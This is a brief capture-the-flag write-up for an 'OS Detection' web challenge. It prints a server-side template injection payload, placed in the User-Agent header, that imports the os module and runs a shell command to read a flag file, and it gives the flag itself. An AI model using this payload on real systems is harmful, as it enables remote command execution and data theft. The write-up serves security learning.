# OS Detection

Solved by: @vicevirus

## Question:
A new service has been deployed that uses advanced algorithms to detect your Operating System. What an invasion of privacy! Can you pwn it?

## Solution:
SSTI on User-agent:
```
User-Agent: {{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag/..2024_12_07_19_19_35.1949737782/flag.txt').read()}}
```

**Flag:** `PP{h4ck3r-OS-d3t3ct3d::oeCeuXQJg6eM}`
